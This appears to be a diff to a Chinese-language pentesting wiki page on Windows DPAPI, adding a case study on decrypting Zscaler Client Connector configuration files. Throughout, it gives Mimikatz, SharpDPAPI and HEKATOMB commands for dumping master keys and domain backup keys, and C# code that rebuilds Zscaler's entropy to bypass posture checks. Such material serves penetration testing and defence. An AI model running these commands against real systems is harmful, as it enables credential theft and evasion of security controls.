@@ -6,7 +6,7 @@
 
 ## 什么是 DPAPI
 
-数据保护 API (DPAPI) 主要用于 Windows 操作系统中，进行 **对称加密非对称私钥**，利用用户或系统秘密作为重要的熵来源。这种方法简化了开发人员的加密过程，使他们能够使用从用户登录秘密派生的密钥进行数据加密，或者对于系统加密，使用系统的域认证秘密，从而免去开发人员自己管理加密密钥保护的需要。
+数据保护 API (DPAPI) 主要用于 Windows 操作系统中，进行 **对称加密非对称私钥**，利用用户或系统秘密作为重要的熵来源。这种方法简化了开发人员的加密工作，使他们能够使用从用户登录秘密派生的密钥进行数据加密，或者在系统加密中使用系统的域认证秘密，从而免去开发人员自己管理加密密钥保护的需要。
 
 使用 DPAPI 的最常见方法是通过 **`CryptProtectData` 和 `CryptUnprotectData`** 函数，这些函数允许应用程序在当前登录的进程会话中安全地加密和解密数据。这意味着加密的数据只能由加密它的同一用户或系统解密。
 
@@ -23,7 +23,7 @@ DPAPI 为每个用户生成一个唯一的密钥（称为 **`pre-key`**），该
 
 此外，每次用户使用 DPAPI 加密某些数据时，都会生成一个新的 **主密钥**。这个主密钥实际上用于加密数据。每个主密钥都有一个 **GUID**（全局唯一标识符）来标识它。
 
-主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的安全标识符。主密钥是通过用户的 **`pre-key`** 加密存储的，同时也通过 **域备份密钥** 进行恢复（因此同一密钥被加密存储两次，使用两种不同的密码）。
+主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是该用户的安全标识符。主密钥是通过用户的 **`pre-key`** 加密存储的，同时也通过 **域备份密钥** 进行恢复（因此同一个密钥被加密存储了两次，使用了两种不同的密码）。
 
 请注意，用于加密主密钥的 **域密钥存储在域控制器中，并且永远不会更改**，因此如果攻击者可以访问域控制器，他们可以检索域备份密钥并解密域中所有用户的主密钥。
 
@@ -41,34 +41,35 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-这就是用户的一组主密钥的样子：
+这是一组用户的主密钥的样子：
 
 ![](<../../images/image (1121).png>)
 
 ### 机器/系统密钥生成
 
-这是用于机器加密数据的密钥。它基于**DPAPI_SYSTEM LSA 密钥**，这是一个只有 SYSTEM 用户可以访问的特殊密钥。此密钥用于加密需要由系统本身访问的数据，例如机器级凭据或系统范围的秘密。
+这是用于机器加密数据的密钥。它基于**DPAPI_SYSTEM LSA 密钥**，这是一个只有SYSTEM用户可以访问的特殊密钥。此密钥用于加密需要系统本身访问的数据，例如机器级凭据或系统范围的秘密。
 
 请注意，这些密钥**没有域备份**，因此只能在本地访问：
 
-- **Mimikatz** 可以通过使用命令 `mimikatz lsadump::secrets` 转储 LSA 秘密来访问它
-- 该秘密存储在注册表中，因此管理员可以**修改 DACL 权限以访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- **Mimikatz**可以通过使用命令`mimikatz lsadump::secrets`来访问它，转储LSA秘密。
+- 该秘密存储在注册表中，因此管理员可以**修改DACL权限以访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
 
-### DPAPI 保护的数据
 
-DPAPI 保护的个人数据包括：
+### DPAPI保护的数据
 
-- Windows 凭据
-- Internet Explorer 和 Google Chrome 的密码和自动完成数据
-- 应用程序（如 Outlook 和 Windows Mail）的电子邮件和内部 FTP 账户密码
-- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
-- 远程桌面连接的密码、.NET Passport 和各种加密和身份验证目的的私钥
-- 由凭据管理器管理的网络密码以及使用 CryptProtectData 的应用程序中的个人数据，例如 Skype、MSN messenger 等
-- 注册表中的加密 blob
+DPAPI保护的个人数据包括：
+
+- Windows凭据
+- Internet Explorer和Google Chrome的密码和自动完成数据
+- 应用程序（如Outlook和Windows Mail）的电子邮件和内部FTP帐户密码
+- 共享文件夹、资源、无线网络和Windows Vault的密码，包括加密密钥
+- 远程桌面连接的密码、.NET Passport和各种加密和身份验证目的的私钥
+- 由凭据管理器管理的网络密码以及使用CryptProtectData的应用程序中的个人数据，例如Skype、MSN Messenger等
+- 注册表中的加密blob
 - ...
 
 系统保护的数据包括：
-- Wifi 密码
+- Wifi密码
 - 计划任务密码
 - ...
 
@@ -82,7 +83,7 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- 拥有本地管理员权限后，可以**访问 LSASS 内存**以提取所有连接用户的 DPAPI 主密钥和 SYSTEM 密钥。
+- 拥有本地管理员权限后，可以**访问LSASS内存**以提取所有连接用户的DPAPI主密钥和SYSTEM密钥。
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
@@ -100,7 +101,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- 如果您以用户身份处于会话中，可以通过 RPC 向 DC 请求 **备份密钥以解密主密钥**。如果您是本地管理员并且用户已登录，您可以为此 **窃取他的会话令牌**：
+- 如果您以用户身份在会话中，可以通过 RPC 向 DC 请求 **备份密钥以解密主密钥**。如果您是本地管理员并且用户已登录，您可以为此 **窃取他的会话令牌**：
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -202,7 +203,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-**SharpDPAPI** 工具还支持这些参数用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密（注意可以使用 `/rpc` 获取域备份密钥，使用 `/password` 来使用明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 来使用当前用户会话...）：
+**SharpDPAPI** 工具还支持这些参数用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密（注意可以使用 `/rpc` 获取域备份密钥，使用 `/password` 以明文密码，使用 `/pvk` 指定 DPAPI 域私钥文件，使用 `/unprotect` 以当前用户会话...）：
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -232,7 +233,7 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ---
 ### 处理可选熵（“第三方熵”）
 
-一些应用程序将额外的 **entropy** 值传递给 `CryptProtectData`。没有这个值，blob 无法被解密，即使知道正确的 masterkey。因此，在针对以这种方式保护的凭据时，获取熵是至关重要的（例如 Microsoft Outlook、某些 VPN 客户端）。
+一些应用程序将额外的 **entropy** 值传递给 `CryptProtectData`。没有这个值，blob 无法解密，即使已知正确的 masterkey。因此，在针对以这种方式保护的凭据时，获取熵是至关重要的（例如 Microsoft Outlook、某些 VPN 客户端）。
 
 [**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) 是一个用户模式 DLL，它在目标进程中钩住 DPAPI 函数，并透明地记录任何提供的可选熵。在 **DLL-injection** 模式下运行 EntropyCapture 针对 `outlook.exe` 或 `vpnclient.exe` 等进程将输出一个文件，将每个熵缓冲区映射到调用进程和 blob。捕获的熵可以稍后提供给 **SharpDPAPI** (`/entropy:`) 或 **Mimikatz** (`/entropy:<file>`) 以解密数据。
 ```powershell
@@ -265,7 +266,7 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动提取 LDAP 目录中所有用户和计算机的工具，并通过 RPC 提取域控制器备份密钥。然后，脚本将解析所有计算机的 IP 地址，并在所有计算机上执行 smbclient，以检索所有用户的 DPAPI blobs，并使用域备份密钥解密所有内容。
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个自动提取 LDAP 目录中所有用户和计算机的工具，并通过 RPC 提取域控制器备份密钥。脚本将解析所有计算机的 IP 地址，并在所有计算机上执行 smbclient，以检索所有用户的 DPAPI blobs，并使用域备份密钥解密所有内容。
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
@@ -298,7 +299,43 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 * **CVE-2023-36004 – Windows DPAPI 安全通道欺骗**（2023年11月）。具有网络访问权限的攻击者可以欺骗域成员检索恶意 DPAPI 备份密钥，从而允许解密用户主密钥。已在 2023 年 11 月的累积更新中修补 – 管理员应确保 DC 和工作站完全修补。
 * **Chrome 127 “App-Bound” cookie 加密**（2024年7月）用存储在用户 **Credential Manager** 下的附加密钥替换了传统的仅 DPAPI 保护。离线解密 cookie 现在需要 DPAPI 主密钥和 **GCM 包装的应用绑定密钥**。SharpChrome v2.3 和 DonPAPI 2.x 能够在以用户上下文运行时恢复额外密钥。
 
+### 案例研究：Zscaler Client Connector – 从 SID 派生的自定义熵
+
+Zscaler Client Connector 在 `C:\ProgramData\Zscaler` 下存储多个配置文件（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个文件都使用 **DPAPI（机器范围）** 加密，但供应商提供的 **自定义熵** 是 *在运行时计算* 的，而不是存储在磁盘上。
+
+熵是由两个元素重建的：
+
+1. 嵌入在 `ZSACredentialProvider.dll` 中的硬编码秘密。
+2. 配置所属 Windows 账户的 **SID**。
+
+DLL 实现的算法相当于：
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+因为秘密嵌入在可以从磁盘读取的 DLL 中，**任何具有 SYSTEM 权限的本地攻击者都可以为任何 SID 重新生成熵**并离线解密这些 blobs：
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+解密会产生完整的 JSON 配置，包括每个 **设备姿态检查** 及其预期值——在尝试客户端绕过时，这些信息非常有价值。
+
+> 提示：其他加密的工件（`*.mtt`，`*.mtp`，`*.mtc`，`*.ztc`）是通过 DPAPI **无** 熵（`16` 个零字节）保护的。因此，一旦获得 SYSTEM 权限，就可以直接使用 `ProtectedData.Unprotect` 解密它们。
+
 ## 参考文献
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
